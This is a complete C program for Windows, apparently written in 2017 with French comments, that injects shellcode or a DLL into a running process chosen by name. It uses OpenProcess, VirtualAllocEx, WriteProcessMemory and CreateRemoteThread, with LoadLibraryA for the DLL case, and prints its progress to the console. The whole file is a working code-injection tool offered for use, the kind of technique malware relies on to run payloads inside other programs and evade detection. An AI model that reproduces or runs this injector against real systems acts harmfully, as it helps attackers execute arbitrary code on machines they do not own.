// 21/05/2017 //
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#define SHELLCODE 0x01
#define DLL 0x02

/**
 * Structure qui contient la taille du shellcode
 * et le buffer contenant celui-ci
 */
typedef  struct MallocRes MallocRes;
struct MallocRes {
    int size;
    char* buffer;
};

/**
 * Affiche les erreurs
 * @param hConsole
 * @param saved_attributes
 * @param msg
 */
void die(HANDLE hConsole,WORD saved_attributes , char* msg)
{
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
    printf(msg);
    SetConsoleTextAttribute(hConsole, saved_attributes);
}

/**
 * Fonction qui charge le buffer dans le tas
 * @param hConsole
 * @param saved_attributes
 * @param shellcodePath
 * @return MallocRes
 */
MallocRes openFile(HANDLE hConsole, WORD saved_attributes, char* shellcodePath)
{
    char* shellcodeFileMalloc = NULL;
    FILE* fichier = NULL;
    int caractereActuel = 0;
    int fileSize = 0;
    int i = 0;

    fichier = fopen(shellcodePath, "rb");

    if (fichier != NULL)
    {
        printf("[+] Opening the shellcode file ... OK\n");
        fseek(fichier, 0L, SEEK_END);
        fileSize = ftell(fichier);
        rewind(fichier);

        shellcodeFileMalloc = malloc(sizeof(char) * fileSize + 1);
        memset(shellcodeFileMalloc, 0, fileSize + 1);
        if(shellcodeFileMalloc != NULL)
        {
            printf("[+] Allocating %d bytes for the shellcode ... OK\n", fileSize);
            do
            {
                caractereActuel = fgetc(fichier); // On lit le caractère
                shellcodeFileMalloc[i] = (char) caractereActuel;
                i++;
            } while (caractereActuel != EOF); // On continue tant que fgetc n'a pas retourné EOF (fin de fichier)
        }
        fclose(fichier);
    }
    else
        die(hConsole,saved_attributes, "[!] Cannot open the shellcode file !\n");

    MallocRes res;
    res.buffer = shellcodeFileMalloc;
    res.size = fileSize;

    return res;

}

/**
 * Retourne le pid
 * @param process_name
 * @return int
 */
int GetCalcPID(char* process_name)
{
    int pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapshot) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if(Process32First(hSnapshot, &pe32)) {
            do {
                if(strcmp(process_name, pe32.szExeFile) == 0)
                {
                    pid = pe32.th32ProcessID;
                    break;
                }

            } while(Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    return pid;
}


int  main(int argc, char* argv[])
{
    int kind;
    DWORD oldProtect = 0;
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
    WORD saved_attributes;
    GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
    saved_attributes = consoleInfo.wAttributes;
    int size;
    char* shellcode;
    LPVOID addr = NULL;
    HANDLE threadID;
    LPVOID AddressVirtualAlloc;

    // < process_name.exe > < chemin vers dll ou shellcode > < dll | shellcode >
    if(argc <= 3)
    {
        die(hConsole, saved_attributes, "[!] No process, path or type given");
        exit(0);
    }

    // si arg 3 = shellcode
    if(strcmp(argv[3], "shellcode") == 0)
    {
        // On récupère le shellcode et sa taille
        MallocRes res = openFile(hConsole, saved_attributes, argv[2]);
        shellcode = res.buffer;
        size = res.size;
        kind = SHELLCODE;
        printf("======== SHELLCODE ========\n");
    }
        // si arg 3 = DLL
    else if(strcmp(argv[3], "dll") == 0)
    {
        // On récupère la DLL
        shellcode = argv[2];
        size = (int)strlen(argv[2]);
        kind = DLL;
        printf("======== DLL ========\n");
    }
    else
    {
        die(hConsole, saved_attributes, "[!] Pleaser enter type of payload");
        exit(0);
    }

    // Si on ne parvient pas à ouvrir le shellcode
    if(shellcode == NULL || size == 0)
    {
        printf("[!] Problème lors de l'ouverture du shellcode ");
    }
    else
    {
        // On récupère le PID
        int pid = GetCalcPID(argv[1]);

        if(pid != 0)
        {
            printf("[+] %s PID = %d\n", argv[1], pid);
            // On récupère un handle sur le processus via sont ID
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

            if(hProcess)
            {
                printf("[+] OpenProcess ... OK\n");

                if(kind == DLL)
                {
                    // Si c'est une DLL on récupère l'adresse de la fonction LoadLibraryA dans kernel32.dll
                    addr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                    if(addr != NULL)
                        printf("[+] GetProcAddress 0x%p\n", addr);
                    else
                    {
                        die(hConsole,saved_attributes,"[!] GetProcAddress... NO\n");
                        exit(0);
                    }
                }

                // On alloue une page de mémoire de la taille du shellcode / path de la DLL et on récupère son adresse de début
                AddressVirtualAlloc = VirtualAllocEx(hProcess, 0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if(AddressVirtualAlloc)
                {
                    printf("[+] Virtual Alloc ... 0x%p\n", AddressVirtualAlloc);
                    // On écrit notre shellcode / path de dll au début de la page
                    if (WriteProcessMemory(hProcess, AddressVirtualAlloc, shellcode, size, NULL))
                    {
                        printf("[+] WriteProcessMemory %d bytes ... OK\n", size);
                        // On change la protection de la page
                        if (VirtualProtectEx(hProcess, AddressVirtualAlloc, size, PAGE_EXECUTE_READ, &oldProtect))
                        {
                            printf("[+] VirtualProtectEx ... OK\n");
                            if(kind == SHELLCODE)
                            {
                                // On crée le thread dans le processus si c'est un shellcode
                                threadID = CreateRemoteThread(hProcess, NULL, 0,  (LPTHREAD_START_ROUTINE) AddressVirtualAlloc, NULL, NULL, NULL);
                            }
                            else
                            {
                                // On crée le thread dans le processus si c'est une DLL
                                threadID = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) addr,  AddressVirtualAlloc, NULL, NULL);
                            }
                            if (threadID != NULL)
                            {
                                // Tout est bon !d
                                printf("[+] CreateRemoteThread ... OK\n");
                                printf("[+] Thread ID %d\n", GetThreadId(threadID));
                                SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
                                printf("[+] Injection successful \n");
                                SetConsoleTextAttribute(hConsole, saved_attributes);
                            }
                            else
                                die(hConsole,saved_attributes,"[!] CreateRemoteThread... NO\n");
                        }
                        else
                            die(hConsole,saved_attributes,"[!] VirtualProtectEx ... NO\n");

                    }
                    else
                        die(hConsole,saved_attributes,"[!] WriteProcessMemory ... NO\n");
                }
                else
                    die(hConsole,saved_attributes,"[!] VirtualAllocEx ... NO\n");

            }
            else
                die(hConsole,saved_attributes,"[!] OpenProcess ... NO\n");
        }
        else
            die(hConsole,saved_attributes,"[!] PID not found\n");
    }



    return 0;
}